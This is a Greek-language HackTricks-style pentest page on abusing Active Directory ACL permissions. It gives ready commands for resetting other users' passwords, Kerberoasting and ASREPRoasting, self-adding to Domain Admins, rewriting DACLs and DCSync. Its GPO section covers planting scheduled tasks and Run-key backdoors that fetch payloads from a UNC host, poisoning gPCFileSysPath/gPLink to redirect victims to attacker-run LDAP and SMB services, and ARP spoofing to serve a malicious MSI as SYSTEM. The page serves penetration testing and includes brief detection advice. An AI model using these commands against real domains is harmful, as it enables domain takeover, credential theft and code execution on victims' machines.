# Κατάχρηση Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Αυτή η σελίδα αποτελεί κυρίως σύνοψη των τεχνικών από τα** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **και** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Για περισσότερες λεπτομέρειες, ανατρέξτε στα αρχικά άρθρα.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Δικαιώματα GenericAll σε User**

Αυτό το privilege παρέχει σε έναν attacker πλήρη έλεγχο ενός λογαριασμού user-στόχου. Μόλις επιβεβαιωθούν τα δικαιώματα `GenericAll` με την εντολή `Get-ObjectAcl`, ένας attacker μπορεί να:

- **Αλλάξει το Password του στόχου**: Χρησιμοποιώντας το `net user <username> <password> /domain`, ο attacker μπορεί να κάνει reset το password του user.
- Από Linux, μπορείτε να κάνετε το ίδιο μέσω SAMR με το Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Αν ο λογαριασμός είναι απενεργοποιημένος, καταργήστε το UAC flag**: Το `GenericAll` επιτρέπει την επεξεργασία του `userAccountControl`. Από Linux, το BloodyAD μπορεί να καταργήσει το flag `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Ανάθεσε ένα SPN στον λογαριασμό του χρήστη ώστε να γίνει kerberoastable και, στη συνέχεια, χρησιμοποίησε τα Rubeus και targetedKerberoast.py για να εξαγάγεις και να επιχειρήσεις να κάνεις crack στα hashes του ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Στοχευμένο ASREPRoasting**: Απενεργοποιήστε το pre-authentication για τον χρήστη, καθιστώντας τον λογαριασμό του ευάλωτο σε ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Με `GenericAll` σε έναν user, μπορείτε να προσθέσετε ένα certificate-based credential και να κάνετε authenticate ως αυτόν χωρίς να αλλάξετε το password του. Δείτε:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Δικαιώματα GenericAll σε Group**

Αυτό το privilege επιτρέπει σε έναν attacker να τροποποιεί τα group memberships, εφόσον έχει δικαιώματα `GenericAll` σε ένα group όπως το `Domain Admins`. Αφού εντοπίσει το distinguished name του group με το `Get-NetGroup`, ο attacker μπορεί:

- **Να προσθέσει τον εαυτό του στο group Domain Admins**: Αυτό μπορεί να γίνει μέσω direct commands ή με τη χρήση modules όπως τα Active Directory ή PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Από Linux μπορείς επίσης να αξιοποιήσεις το BloodyAD για να προσθέσεις τον εαυτό σου σε αυθαίρετες ομάδες, όταν έχεις δικαιώματα GenericAll/Write πάνω σε αυτές. Αν η ομάδα-στόχος είναι ένθετη στο “Remote Management Users”, θα αποκτήσεις αμέσως πρόσβαση WinRM σε hosts που αναγνωρίζουν αυτήν την ομάδα:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write σε Υπολογιστή/Χρήστη**

Η κατοχή αυτών των δικαιωμάτων σε ένα αντικείμενο υπολογιστή ή σε έναν λογαριασμό χρήστη επιτρέπει:

- **Kerberos Resource-based Constrained Delegation**: Επιτρέπει την κατάληψη ενός αντικειμένου υπολογιστή.
- **Shadow Credentials**: Χρήση αυτής της τεχνικής για την impersonation ενός λογαριασμού υπολογιστή ή χρήστη, μέσω εκμετάλλευσης των δικαιωμάτων για τη δημιουργία shadow credentials.

## **WriteProperty σε Group**

Εάν ένας χρήστης έχει δικαιώματα `WriteProperty` σε όλα τα αντικείμενα μιας συγκεκριμένης ομάδας (π.χ., `Domain Admins`), μπορεί να:

- **Προσθέσει τον εαυτό του στην ομάδα Domain Admins**: Αυτό επιτυγχάνεται μέσω του συνδυασμού των εντολών `net user` και `Add-NetGroupUser` και επιτρέπει την κλιμάκωση προνομίων εντός του domain.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) σε Group**

Αυτό το privilege επιτρέπει στους επιτιθέμενους να προσθέσουν οι ίδιοι τους εαυτούς τους σε συγκεκριμένα groups, όπως το `Domain Admins`, μέσω commands που τροποποιούν απευθείας τη συμμετοχή σε group. Η ακόλουθη ακολουθία commands επιτρέπει την αυτοπροσθήκη:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Ένα παρόμοιο privilege επιτρέπει στους attackers να προσθέσουν απευθείας τον εαυτό τους σε groups, τροποποιώντας τις ιδιότητες των groups, εφόσον έχουν το δικαίωμα `WriteProperty` σε αυτά τα groups. Η επιβεβαίωση και η εκτέλεση αυτού του privilege πραγματοποιούνται με:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Η κατοχή του `ExtendedRight` σε έναν χρήστη για το `User-Force-Change-Password` επιτρέπει την επαναφορά κωδικών πρόσβασης χωρίς να είναι γνωστός ο τρέχων κωδικός πρόσβασης. Η επαλήθευση αυτού του δικαιώματος και η εκμετάλλευσή του μπορούν να πραγματοποιηθούν μέσω PowerShell ή εναλλακτικών εργαλείων command-line, προσφέροντας διάφορες μεθόδους για την επαναφορά του κωδικού πρόσβασης ενός χρήστη, συμπεριλαμβανομένων interactive sessions και one-liners για non-interactive περιβάλλοντα. Οι εντολές κυμαίνονται από απλές invocations του PowerShell έως τη χρήση του `rpcclient` σε Linux, επιδεικνύοντας την ευελιξία των attack vectors.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner σε Group**

Εάν ένας attacker εντοπίσει ότι έχει δικαιώματα `WriteOwner` σε ένα group, μπορεί να αλλάξει την ιδιοκτησία του group και να την αναθέσει στον εαυτό του. Αυτό είναι ιδιαίτερα σημαντικό όταν το συγκεκριμένο group είναι το `Domain Admins`, καθώς η αλλαγή ιδιοκτησίας επιτρέπει ευρύτερο έλεγχο στα attributes και τα μέλη του group. Η διαδικασία περιλαμβάνει τον εντοπισμό του σωστού object μέσω του `Get-ObjectAcl` και, στη συνέχεια, τη χρήση του `Set-DomainObjectOwner` για την τροποποίηση του owner, είτε μέσω SID είτε μέσω name.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Αυτή η άδεια επιτρέπει σε έναν attacker να τροποποιεί ιδιότητες χρηστών. Συγκεκριμένα, με πρόσβαση `GenericWrite`, ο attacker μπορεί να αλλάξει τη διαδρομή του logon script ενός χρήστη, ώστε να εκτελείται ένα malicious script κατά το logon του χρήστη. Αυτό επιτυγχάνεται με τη χρήση της εντολής `Set-ADObject`, για την ενημέρωση της ιδιότητας `scriptpath` του χρήστη-στόχου, ώστε να δείχνει στο script του attacker.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite σε Group**

Με αυτό το privilege, οι attackers μπορούν να χειραγωγούν τη συμμετοχή σε groups, όπως να προσθέτουν τους εαυτούς τους ή άλλους users σε συγκεκριμένα groups. Αυτή η διαδικασία περιλαμβάνει τη δημιουργία ενός credential object, τη χρήση του για την προσθήκη ή την αφαίρεση users από ένα group και την επαλήθευση των αλλαγών συμμετοχής με εντολές PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Από Linux, το Samba `net` μπορεί να προσθέτει/αφαιρεί μέλη όταν διαθέτετε `GenericWrite` στην ομάδα (χρήσιμο όταν το PowerShell/RSAT δεν είναι διαθέσιμο):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Η κατοχή ενός αντικειμένου AD και η ύπαρξη δικαιωμάτων `WriteDACL` σε αυτό επιτρέπει σε έναν attacker να εκχωρήσει στον εαυτό του δικαιώματα `GenericAll` στο αντικείμενο. Αυτό επιτυγχάνεται μέσω χειρισμού ADSI, παρέχοντας πλήρη έλεγχο του αντικειμένου και τη δυνατότητα τροποποίησης των group memberships του. Παρ' όλα αυτά, υπάρχουν περιορισμοί κατά την προσπάθεια εκμετάλλευσης αυτών των δικαιωμάτων μέσω των cmdlets `Set-Acl` / `Get-Acl` του Active Directory module.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner γρήγορη ανάληψη ελέγχου (PowerView)

Όταν έχετε `WriteOwner` και `WriteDacl` σε έναν user ή service account, μπορείτε να αποκτήσετε πλήρη έλεγχο και να επαναφέρετε τον κωδικό πρόσβασής του χρησιμοποιώντας το PowerView, χωρίς να γνωρίζετε τον παλιό κωδικό πρόσβασης:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Σημειώσεις:
- Ίσως χρειαστεί πρώτα να αλλάξετε τον owner σε εσάς, αν έχετε μόνο `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Επικυρώστε την πρόσβαση με οποιοδήποτε πρωτόκολλο (SMB/LDAP/RDP/WinRM) μετά την επαναφορά του κωδικού πρόσβασης.

## **Replication on the Domain (DCSync)**

Η επίθεση DCSync εκμεταλλεύεται συγκεκριμένα δικαιώματα replication στο domain για να μιμηθεί έναν Domain Controller και να συγχρονίσει δεδομένα, συμπεριλαμβανομένων των διαπιστευτηρίων χρηστών. Αυτή η ισχυρή τεχνική απαιτεί δικαιώματα όπως `DS-Replication-Get-Changes`, επιτρέποντας στους attackers να εξάγουν ευαίσθητες πληροφορίες από το περιβάλλον AD χωρίς άμεση πρόσβαση σε Domain Controller.<sup>[[5]](#references)</sup> [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Η delegated πρόσβαση για τη διαχείριση Group Policy Objects (GPOs) μπορεί να παρουσιάσει σημαντικούς κινδύνους ασφαλείας. Για παράδειγμα, αν σε έναν χρήστη όπως ο `offense\spotless` έχουν εκχωρηθεί δικαιώματα διαχείρισης GPO, μπορεί να διαθέτει προνόμια όπως **WriteProperty**, **WriteDacl** και **WriteOwner**. Αυτά τα δικαιώματα μπορούν να χρησιμοποιηθούν καταχρηστικά για κακόβουλους σκοπούς, όπως εντοπίστηκε με τη χρήση του PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerate GPO Permissions

Για τον εντοπισμό λανθασμένα ρυθμισμένων GPOs, τα cmdlets του PowerSploit μπορούν να συνδυαστούν. Αυτό επιτρέπει την ανακάλυψη των GPOs που ένας συγκεκριμένος χρήστης έχει δικαιώματα να διαχειρίζεται: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: Είναι δυνατός ο εντοπισμός των υπολογιστών στους οποίους εφαρμόζεται ένα συγκεκριμένο GPO, βοηθώντας στην κατανόηση του εύρους των πιθανών επιπτώσεων. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Για να δείτε ποιες πολιτικές εφαρμόζονται σε έναν συγκεκριμένο υπολογιστή, μπορούν να χρησιμοποιηθούν εντολές όπως η `Get-DomainGPO`.

**OUs with a Given Policy Applied**: Ο εντοπισμός των organizational units (OUs) που επηρεάζονται από μια συγκεκριμένη πολιτική μπορεί να γίνει με τη χρήση της `Get-DomainOU`.

Μπορείτε επίσης να χρησιμοποιήσετε το εργαλείο [**GPOHound**](https://github.com/cogiceo/GPOHound) για την απαρίθμηση GPOs και τον εντοπισμό προβλημάτων σε αυτά.

### Abuse GPO - New-GPOImmediateTask

Τα λανθασμένα ρυθμισμένα GPOs μπορούν να αξιοποιηθούν για την εκτέλεση code, για παράδειγμα με τη δημιουργία μιας immediate scheduled task. Αυτό μπορεί να γίνει για την προσθήκη ενός χρήστη στην ομάδα local administrators στα επηρεαζόμενα μηχανήματα, αυξάνοντας σημαντικά τα privileges:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Το module GroupPolicy, εφόσον είναι εγκατεστημένο, επιτρέπει τη δημιουργία και τη σύνδεση νέων GPO, καθώς και τον ορισμό προτιμήσεων, όπως τιμές μητρώου, για την εκτέλεση backdoors στους επηρεαζόμενους υπολογιστές. Αυτή η μέθοδος απαιτεί την ενημέρωση του GPO και τη σύνδεση ενός χρήστη στον υπολογιστή για την εκτέλεση:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Κατάχρηση GPO

Το SharpGPOAbuse προσφέρει μια μέθοδο κατάχρησης υπαρχόντων GPO, προσθέτοντας tasks ή τροποποιώντας ρυθμίσεις χωρίς να απαιτείται η δημιουργία νέων GPO. Αυτό το tool απαιτεί την τροποποίηση υπαρχόντων GPO ή τη χρήση RSAT tools για τη δημιουργία νέων, πριν από την εφαρμογή των αλλαγών:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Εξαναγκασμός ενημέρωσης πολιτικής

Οι ενημερώσεις GPO πραγματοποιούνται συνήθως περίπου κάθε 90 λεπτά. Για την επιτάχυνση αυτής της διαδικασίας, ειδικά μετά την εφαρμογή μιας αλλαγής, μπορεί να χρησιμοποιηθεί η εντολή `gpupdate /force` στον υπολογιστή-στόχο, ώστε να εξαναγκαστεί άμεση ενημέρωση της πολιτικής. Αυτή η εντολή διασφαλίζει ότι τυχόν τροποποιήσεις στα GPO εφαρμόζονται χωρίς αναμονή για τον επόμενο αυτόματο κύκλο ενημέρωσης.

### Εσωτερική λειτουργία

Κατά την επιθεώρηση των Scheduled Tasks για ένα δεδομένο GPO, όπως το `Misconfigured Policy`, μπορεί να επιβεβαιωθεί η προσθήκη tasks όπως το `evilTask`. Αυτά τα tasks δημιουργούνται μέσω scripts ή εργαλείων γραμμής εντολών με στόχο την τροποποίηση της συμπεριφοράς του συστήματος ή την κλιμάκωση προνομίων.

Η δομή του task, όπως εμφανίζεται στο αρχείο διαμόρφωσης XML που δημιουργείται από το `New-GPOImmediateTask`, περιγράφει τις λεπτομέρειες του scheduled task - συμπεριλαμβανομένης της εντολής που θα εκτελεστεί και των triggers του. Αυτό το αρχείο αναπαριστά τον τρόπο με τον οποίο ορίζονται και διαχειρίζονται τα scheduled tasks μέσα στα GPO, παρέχοντας μια μέθοδο για την εκτέλεση arbitrary εντολών ή scripts στο πλαίσιο επιβολής πολιτικής.

### Χρήστες και Groups

Τα GPO επιτρέπουν επίσης τον χειρισμό των memberships χρηστών και groups στα συστήματα-στόχους. Με την απευθείας επεξεργασία των αρχείων πολιτικής Users and Groups, οι attackers μπορούν να προσθέσουν χρήστες σε privileged groups, όπως το τοπικό group `administrators`. Αυτό είναι δυνατό μέσω της ανάθεσης δικαιωμάτων διαχείρισης GPO, η οποία επιτρέπει την τροποποίηση των αρχείων πολιτικής για την προσθήκη νέων χρηστών ή την αλλαγή των memberships των groups.

Το αρχείο διαμόρφωσης XML για το Users and Groups περιγράφει τον τρόπο υλοποίησης αυτών των αλλαγών. Με την προσθήκη entries σε αυτό το αρχείο, συγκεκριμένοι χρήστες μπορούν να αποκτήσουν elevated privileges σε όλα τα επηρεαζόμενα συστήματα. Αυτή η μέθοδος προσφέρει μια άμεση προσέγγιση για privilege escalation μέσω χειρισμού GPO.

Επιπλέον, μπορούν να εξεταστούν και άλλες μέθοδοι για την εκτέλεση code ή τη διατήρηση persistence, όπως η αξιοποίηση logon/logoff scripts, η τροποποίηση registry keys για autoruns, η εγκατάσταση software μέσω αρχείων .msi ή η επεξεργασία configurations services. Αυτές οι τεχνικές παρέχουν διάφορους τρόπους για τη διατήρηση access και τον έλεγχο συστημάτων-στόχων μέσω abuse των GPO.

### Ανακατεύθυνση της ανάκτησης GPC/GPT σε authenticated rogue services

Ένα GPO αποτελείται από ένα LDAP **Group Policy Container (GPC)** με metadata και ένα SMB-hosted **Group Policy Template (GPT)** με τα αρχεία πολιτικής. Κατά την ανανέωση, ο client ακολουθεί το `gPLink` του container, διαβάζει το αναφερόμενο GPC και το `gPCFileSysPath` του και, στη συνέχεια, κατεβάζει το GPT από αυτό το UNC path. Κατά συνέπεια, η write access είτε στο ίδιο το GPC είτε στο `gPLink` ενός OU, Site ή Domain μπορεί να μετατραπεί σε privileged policy processing.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Poisoning του `gPCFileSysPath` με GPOddity

Αν το controlled principal μπορεί να γράψει στο target GPC (απευθείας ή μέσω **NTLM relay to LDAP**), αντικαταστήστε το `gPCFileSysPath` με ένα UNC path που φιλοξενείται από τον attacker. Το [GPOddity](https://github.com/synacktiv/GPOddity) αυτοματοποιεί την αλλαγή LDAP και εξυπηρετεί ένα malicious GPT που περιέχει module-based policy files ή ένα Immediate Task, το οποίο ο Group Policy client εκτελεί ως `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Ένα anonymous ή credential-agnostic SMB share δεν επαρκεί σε σύγχρονους Windows clients: το SMB Secure Negotiate απαιτεί proof ότι το authentication ολοκληρώθηκε επιτυχώς, επομένως το rogue service πρέπει να επικυρώνει την domain identity, να παράγει το SMB session key και να υπογράφει σωστά τις απαντήσεις του. Σε embedded mode, ρυθμίστε το GPOddity με ένα controlled machine account και το service key του και, στη συνέχεια, επιλέξτε ένα computer- ή user-side payload στην ενότητα `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>
```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```
**Edge case του User GPO:** μετά το MS16-072, τα Windows εξακολουθούν να δημιουργούν δύο SMB2 sessions στην **ίδια TCP connection**: το user session διαβάζει το `GPT.INI`, και στη συνέχεια το computer-account session διαβάζει την effective configuration, όπως το `ScheduledTasks.xml`. Επομένως, ένας rogue server πρέπει να καταχωρίζει τα authentication state, session keys και signing keys ανά SMB2 `SessionId` και όχι μόνο ανά socket. Το Scapy fork που είναι ενσωματωμένο στα GPOddity/OUned το υλοποιεί μέσω των `SMBStreamSocketMultiplexing` και ενός multiplexing-aware `SMBServer`. Οι single-session Impacket/Scapy servers διαφορετικά επαναχρησιμοποιούν το λάθος signing state και αποτυγχάνουν στα user policies.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning με OUned

Με `WriteGPLink`, `GenericWrite` ή ισοδύναμο έλεγχο σε OU, Site ή Domain, ένας attacker μπορεί να προσθέσει ένα link του οποίου το GPC DN παρέχεται από έναν attacker-controlled LDAP host. Αυτό το primitive παρουσιάστηκε αρχικά από τον Petros Koutroumpis· το [OUned](https://github.com/synacktiv/OUned) αυτοματοποιεί το LDAP write και την κακόβουλη αλυσίδα GPC/GPT.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```
Το θύμα πρώτα πραγματοποιεί authentication στην rogue υπηρεσία LDAP και λαμβάνει ένα GPC του οποίου το `gPCFileSysPath` δείχνει στην rogue υπηρεσία SMB· στη συνέχεια πραγματοποιεί authentication στο SMB και εφαρμόζει το παρεχόμενο GPT. Επομένως, το OUned χρειάζεται έναν λογαριασμό με LDAP SPN, έναν λογαριασμό υπολογιστή με HOST SPN για SMB (ο ίδιος λογαριασμός υπολογιστή μπορεί να καλύψει και τα δύο) και επίλυση DNS ή reverse forwarding που στέλνει τις θύρες 389 και 445 στον host του operator.<sup>[[15]](#references)[[17]](#references)</sup>
```bash
python3 OUned.py --config config.ini -v
```
Ο embedded Scapy LDAP server του OUned επικυρώνει το Kerberos/SPNEGO με το πραγματικό controlled service key και εξυπηρετεί αυθαίρετα δεδομένα GPC από JSON. Το κενό JSON key μοντελοποιεί το rootDSE, τα prefixes `base64:` αναπαριστούν binary values και ο server υποστηρίζει add/delete/modify/search, καθώς και searches `BASE`, `LEVEL` και `SUBTREE`. Μπορεί να διαπραγματευτεί προστασία χωρίς προστασία, ακεραιότητα ή εμπιστευτικότητα. Αυτό καθιστά το service επαναχρησιμοποιήσιμο όταν κάποιο άλλο Windows component ακολουθεί ένα LDAP reference που ελέγχεται από attacker, αλλά απαιτεί authenticated LDAP.<sup>[[15]](#references)</sup>

Μην υποθέτετε ότι ο συγχρονισμός ενός account password σε ένα dummy domain αναπαράγει κάθε Kerberos key: το RC4 προκύπτει από το password, ενώ το AES string-to-key χρησιμοποιεί επίσης ένα salt που προκύπτει από το hostname/domain του principal. Η παροχή του πραγματικού account AES key στο `KerberosSSP` αποφεύγει την επιβολή χρήσης RC4 μέσω μιας ανιχνεύσιμης αλλαγής στο self-writable `msDS-SupportedEncryptionTypes` του machine account.<sup>[[15]](#references)</sup>

#### Detection pivots

Συσχετίστε αλλαγές στα `gPCFileSysPath` ή `gPLink` με αλλαγές στις εκδόσεις GPO και νέα Immediate/Scheduled Task XML. Ερευνήστε links προς μη αναμενόμενα naming contexts, UNC hosts εκτός του εγκεκριμένου συνόλου DC/SYSVOL, DNS records που ανακατευθύνουν machine-account names, LDAP/CIFS service tickets για ασυνήθιστα machine accounts και αλλαγές στο `msDS-SupportedEncryptionTypes` που ενεργοποιούν το RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

Το `WriteGPLink` σε OU/domain σάς επιτρέπει να τροποποιήσετε το attribute `gPLink` του target container και να **επιβάλετε την εφαρμογή ενός υπάρχοντος GPO** χωρίς να επεξεργαστείτε το ίδιο το GPO. Αυτό αποκτά ενδιαφέρον όταν το linked GPO αναφέρεται ήδη σε remote content μέσω **UNC paths** (`\\HOST\share\...`), επειδή οι authenticated users μπορούν να διαβάσουν το **SYSVOL** και να αναζητήσουν επαναχρησιμοποιήσιμες policies offline.<sup>[[11]](#references)</sup>

Workflow υψηλού επιπέδου:

1. Χρησιμοποιήστε το BloodHound για να εντοπίσετε έναν principal με `WriteGPLink` σε ένα OU και να απαριθμήσετε τους computers/users μέσα σε αυτό το OU.
2. Κλωνοποιήστε το `SYSVOL` read-only και αναλύστε τα GPOs αναζητώντας **Software Installation**, **drive mappings** (`Drives.xml`) και **logon/startup scripts** που αναφέρονται σε UNC paths.
3. Προτιμήστε policies που δείχνουν σε ένα **direct hostname** (για παράδειγμα `\\DC02\share\pkg.msi`) αντί για DFS/domain-namespace paths, επειδή τα hostname-based paths είναι ευκολότερο να ανακατευθυνθούν με L2 spoofing.
4. Προσθέστε το επιλεγμένο GPO GUID στο `gPLink` του target OU, ώστε το victim να επεξεργαστεί αυτή την ήδη υπάρχουσα policy.
5. Στο ίδιο broadcast domain, εκτελέστε ARP spoofing στο UNC host και κάντε bind το IP του τοπικά (`ip addr add <target_ip>/32 dev <iface>`), ώστε η SMB traffic του victim να φτάσει στο host σας.
6. Εξυπηρετήστε το αναμενόμενο path/filename από έναν attacker SMB server (για παράδειγμα `smbserver.py`) και περιμένετε το κανονικό policy processing.

Παράδειγμα συλλογής `SYSVOL` και συσχέτισης GPO:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Συνδέστε το υπάρχον GPO με το OU-στόχο:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Αν το συνδεδεμένο GPO αναπτύσσει ένα MSI από διαδρομή UNC, ο client θα το ανακτήσει κατά την **εκκίνηση του υπολογιστή** και θα το εγκαταστήσει ως **`NT AUTHORITY\SYSTEM`**. Με πλαστογράφηση του host που αναφέρεται και με παροχή ενός κακόβουλου MSI στο **ίδιο share/path/name**, μπορείτε να μετατρέψετε το `WriteGPLink` σε εκτέλεση κώδικα ως SYSTEM **χωρίς τροποποίηση του SYSVOL**.

Σημαντικοί περιορισμοί:

- **Ο χρονισμός έχει σημασία**: ο νέος σύνδεσμος εμφανίζεται κατά το policy refresh (συνήθως περίπου κάθε 90 λεπτά), αλλά το **Software Installation** συνήθως ενεργοποιείται κατά την **επανεκκίνηση**.
- Το Windows Installer συνήθως παρακολουθεί την ανάπτυξη χρησιμοποιώντας το **`ProductCode`** του package. Αν το product είναι ήδη εγκατεστημένο, η ανάπτυξη μπορεί να παραλειφθεί.
- Για να αποφύγετε την απόρριψη από τον installer, τροποποιήστε το rogue MSI ώστε τα **`ProductCode`** και **`PackageCode`** του να ταιριάζουν με εκείνα του legitimate package που αναμένει το GPO.
- Παλιά αρχεία advertisement `.aas` ενδέχεται να παραμείνουν στο `SYSVOL`, επομένως επιβεβαιώστε ότι η ανάπτυξη εξακολουθεί να φαίνεται ενεργή πριν βασιστείτε σε αυτήν.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
